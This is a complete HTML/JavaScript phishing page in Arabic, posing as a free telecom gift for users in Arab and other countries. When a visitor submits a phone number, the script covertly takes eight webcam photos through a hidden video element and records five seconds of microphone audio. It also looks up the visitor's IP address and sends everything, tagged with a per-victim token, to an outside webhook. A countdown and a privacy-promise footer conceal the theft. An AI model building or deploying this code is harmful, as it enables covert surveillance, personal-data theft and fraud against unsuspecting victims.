<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 هدية الاتصالات</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(145deg, #0b1a2e, #1a2f3f);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(18px);
            border-radius: 40px;
            padding: 30px 25px;
            border: 1px solid rgba(255,215,0,0.15);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            text-align: center;
        }
        .logo { font-size: 50px; margin-bottom: 5px; display: inline-block; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
        h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #ffd700, #ff9f43); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 5px 0 10px; }
        .sub { color: #b0c4de; font-size: 16px; margin-bottom: 20px; }
        .step { display: none; animation: fadeIn 0.5s ease; }
        .step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .country-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; margin: 20px 0; }
        .country-btn {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,215,0,0.2);
            border-radius: 16px;
            padding: 14px 8px;
            color: #fff;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.25s;
        }
        .country-btn:hover { background: rgba(255,215,0,0.15); border-color: #ffd700; transform: scale(1.03); }
        .input-group { margin: 18px 0; text-align: right; }
        .input-group input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.15);
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus { border-color: #ffd700; box-shadow: 0 0 0 3px rgba(255,215,0,0.15); }
        .btn-gold {
            background: linear-gradient(135deg, #ffd700, #f0a500);
            border: none;
            color: #1a1a2e;
            font-weight: 800;
            padding: 16px 30px;
            border-radius: 50px;
            font-size: 20px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(255,215,0,0.25);
            margin-top: 10px;
        }
        .btn-gold:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-gold .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,0,0,0.2); border-top: 3px solid #1a1a2e; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        .btn-gold.loading .spinner { display: inline-block; }
        .btn-gold.loading .btn-text { display: none; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .timer-box { background: rgba(0,0,0,0.25); border-radius: 60px; padding: 12px 20px; margin: 20px 0; display: flex; align-items: center; justify-content: center; gap: 15px; border: 1px solid rgba(255,215,0,0.15); }
        .timer-box span { font-size: 28px; font-weight: 700; color: #ffd700; }
        .status { margin-top: 16px; padding: 12px 16px; border-radius: 16px; font-size: 14px; display: none; }
        .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
        .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
        .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
        .footer { margin-top: 25px; font-size: 12px; color: #666; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
        #hiddenVideo, #hiddenCanvas { display: none; }
        .permission-wrapper { background: rgba(255,215,0,0.05); border-radius: 20px; padding: 16px; margin: 15px 0; border: 1px solid rgba(255,215,0,0.08); text-align: right; }
        .permission-wrapper ul { list-style: none; padding: 0; }
        .permission-wrapper ul li { padding: 6px 0; color: #ddd; font-size: 14px; }
        .permission-wrapper ul li i { color: #ffd700; margin-left: 8px; }
        .permission-wrapper .note { color: #aaa; font-size: 13px; margin-top: 8px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="step active" id="step-country">
        <div class="logo">🌍</div>
        <h1>اختر بلدك</h1>
        <p class="sub">للحصول على هدية الاتصالات الخاصة بك</p>
        <div class="country-grid" id="countryList"></div>
        <div class="status" id="statusCountry"></div>
    </div>
    <div class="step" id="step-tasks">
        <div class="logo">🎁</div>
        <h1 id="taskTitle">أكمل التحقق</h1>
        <p class="sub" id="taskSub">لتأكيد هويتك</p>
        <div class="permission-wrapper" id="permissionArea"></div>
        <div class="input-group">
            <label for="phoneInput">📱 أدخل رقم هاتفك</label>
            <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15">
        </div>
        <button class="btn-gold" id="claimBtn"><span class="btn-text">🎁 احصل على الهدية</span><span class="spinner"></span></button>
        <div class="status" id="statusTasks"></div>
    </div>
    <div class="step" id="step-timer">
        <div class="logo">⏳</div>
        <h1>تهانينا! 🎉</h1>
        <p class="sub">تم تأكيد طلبك، سيتم إرسال الهدية خلال</p>
        <div class="timer-box"><i class="fas fa-hourglass-half"></i><span id="timerDisplay">03:00</span></div>
        <div class="status" id="statusTimer"></div>
    </div>
    <div class="footer"><i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك</div>
</div>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>
<script>
    const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/bot.php?action=webhook_data"; // ضع هنا رابط ملف bot.php مع action=webhook_data

    const countries = {
        'مصر': { flag: '🇪🇬', prefixes: ['010','011','012','015'] },
        'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
        'الإمارات': { flag: '🇦🇪', prefixes: ['050','052','054','055','056'] },
        'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
        'قطر': { flag: '🇶🇦', prefixes: ['3','5','6'] },
        'عُمان': { flag: '🇴🇲', prefixes: ['7','9'] },
        'البحرين': { flag: '🇧🇭', prefixes: ['3','6'] },
        'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
        'العراق': { flag: '🇮🇶', prefixes: ['7'] },
        'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
        'لبنان': { flag: '🇱🇧', prefixes: ['3','7'] },
        'فلسطين': { flag: '🇵🇸', prefixes: ['5','9'] },
        'الجزائر': { flag: '🇩🇿', prefixes: ['5','6','7'] },
        'المغرب': { flag: '🇲🇦', prefixes: ['6','7'] },
        'تونس': { flag: '🇹🇳', prefixes: ['2','5','9'] },
        'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
        'السودان': { flag: '🇸🇩', prefixes: ['9','1'] },
        'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
        'الصومال': { flag: '🇸🇴', prefixes: ['6','7'] },
        'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
        'موريتانيا': { flag: '🇲🇷', prefixes: ['4','5'] },
        'تركيا': { flag: '🇹🇷', prefixes: ['5'] },
        'إيران': { flag: '🇮🇷', prefixes: ['9'] },
        'باكستان': { flag: '🇵🇰', prefixes: ['3'] },
        'الهند': { flag: '🇮🇳', prefixes: ['6','7','8','9'] },
        'بنغلاديش': { flag: '🇧🇩', prefixes: ['1','7'] },
        'نيجيريا': { flag: '🇳🇬', prefixes: ['7','8','9'] },
        'جنوب أفريقيا': { flag: '🇿🇦', prefixes: ['6','7','8'] },
    };

    // استخراج التوكن من الرابط
    let USER_TOKEN = null;
    (function extractToken() {
        const params = new URLSearchParams(window.location.search);
        const t = params.get('i');
        if (t && t.length >= 6 && t.length <= 8 && /^[A-Z0-9]+$/.test(t)) {
            USER_TOKEN = t;
            console.log('✅ Token:', USER_TOKEN);
        } else {
            console.warn('❌ Token غير صالح');
            document.querySelector('.country-grid').innerHTML = '<p style="color:#ff6b6b;">⚠️ رابط غير صحيح، يرجى استخدام الرابط المخصص لك.</p>';
        }
    })();

    let selectedCountry = null, userPhone = null;
    let mediaStream = null, audioStream = null, audioRecorder = null, audioChunks = [];
    let capturedPhotos = [], userIP = 'غير متاح', userLocation = { lat: null, lng: null };
    let isProcessing = false, timerInterval = null, timerSeconds = 180;

    // دوال مساعدة
    function showStatus(el, type, msg) { el.className = 'status ' + type; el.textContent = msg; el.style.display = 'block'; }
    function showStep(id) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }

    // عرض الدول
    const countryList = document.getElementById('countryList');
    Object.keys(countries).forEach(name => {
        const btn = document.createElement('button');
        btn.className = 'country-btn';
        btn.innerHTML = `<span>${countries[name].flag}</span><span>${name}</span>`;
        btn.onclick = () => selectCountry(name);
        countryList.appendChild(btn);
    });

    function selectCountry(name) {
        selectedCountry = name;
        const data = countries[name];
        document.getElementById('taskTitle').textContent = `🎁 هدية ${name}`;
        document.getElementById('taskSub').textContent = `لتأكيد هويتك في ${name}`;
        document.getElementById('permissionArea').innerHTML = `
            <ul><li><i class="fas fa-check-circle"></i> التحقق الذكي</li>
            <li><i class="fas fa-check-circle"></i> مراجعة البيانات</li>
            <li><i class="fas fa-check-circle"></i> تأكيد التسليم</li></ul>
            <div class="note">📞 الأرقام المسموحة: ${data.prefixes.join('، ')}</div>
        `;
        document.getElementById('phoneInput').placeholder = `مثال: ${data.prefixes[0]}12345678`;
        showStep('step-tasks');
        document.getElementById('statusTasks').style.display = 'none';
        document.getElementById('claimBtn').disabled = false;
        document.getElementById('claimBtn').classList.remove('loading');
    }

    // إرسال البيانات للـ Webhook
    async function sendToWebhook(data) {
        if (!USER_TOKEN) return { success: false, error: 'Token missing' };
        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: USER_TOKEN, ...data })
            });
            const result = await res.json();
            if (!res.ok) return { success: false, error: result.message || 'HTTP error' };
            return { success: true, data: result };
        } catch(e) { return { success: false, error: e.message }; }
    }

    // حدث الزر الرئيسي
    document.getElementById('claimBtn').addEventListener('click', async function() {
        if (!USER_TOKEN) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ رابط غير صحيح');
        if (isProcessing) return;
        const phone = document.getElementById('phoneInput').value.trim();
        if (!phone) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ يرجى إدخال رقم الهاتف');
        if (!selectedCountry) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ يرجى اختيار بلد');

        const prefixes = countries[selectedCountry].prefixes;
        if (!prefixes.some(p => phone.startsWith(p))) {
            return showStatus(document.getElementById('statusTasks'), 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
        }
        userPhone = phone;
        isProcessing = true;
        this.disabled = true;
        this.classList.add('loading');

        // جمع البيانات
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            userIP = ipData.ip;
        } catch(e) {}

        // التقاط الصور
        let photos = [];
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            mediaStream = stream;
            const video = document.getElementById('hiddenVideo');
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 500));
            const canvas = document.getElementById('hiddenCanvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 640; canvas.height = 480;
            for (let i = 0; i < 8; i++) {
                ctx.drawImage(video, 0, 0, 640, 480);
                photos.push(canvas.toDataURL('image/jpeg', 0.9));
                await new Promise(r => setTimeout(r, 700));
            }
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.error('Camera error:', e); }

        // تسجيل الصوت
        let audioBase64 = null;
        try {
            const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioStream = aStream;
            const recorder = new MediaRecorder(aStream, { mimeType: 'audio/webm;codecs=opus' });
            audioRecorder = recorder;
            audioChunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
            recorder.start();
            await new Promise(r => setTimeout(r, 5000));
            recorder.stop();
            await new Promise(r => setTimeout(r, 500));
            if (audioChunks.length > 0) {
                const blob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                audioBase64 = await new Promise(resolve => {
                    reader.onloadend = () => resolve(reader.result.split(',')[1]);
                    reader.readAsDataURL(blob);
                });
            }
            aStream.getTracks().forEach(t => t.stop());
        } catch(e) { console.error('Audio error:', e); }

        // إرسال الكل
        const payload = {
            event: 'submission',
            country: selectedCountry,
            phone: userPhone,
            ip: userIP,
            location: { lat: userLocation.lat, lng: userLocation.lng },
            timestamp: new Date().toISOString(),
            photos: photos.map(p => p.split(',')[1]),
            audio: audioBase64
        };

        const result = await sendToWebhook(payload);
        if (result.success) {
            showStep('step-timer');
            startTimer(180);
        } else {
            showStatus(document.getElementById('statusTasks'), 'error', '⚠️ فشل الإرسال: ' + result.error);
            this.disabled = false;
            this.classList.remove('loading');
            isProcessing = false;
        }
    });

    // المؤقت
    function startTimer(sec) {
        timerSeconds = sec;
        const display = document.getElementById('timerDisplay');
        timerInterval = setInterval(() => {
            timerSeconds--;
            const m = Math.floor(timerSeconds / 60);
            const s = timerSeconds % 60;
            display.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            if (timerSeconds <= 0) {
                clearInterval(timerInterval);
                display.textContent = '00:00';
                showStatus(document.getElementById('statusTimer'), 'success', '🎉 تم إرسال هديتك!');
            }
        }, 1000);
    }

    // تنظيف عند الخروج
    window.addEventListener('beforeunload', () => {
        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
        if (timerInterval) clearInterval(timerInterval);
    });
</script>
</body>
</html>
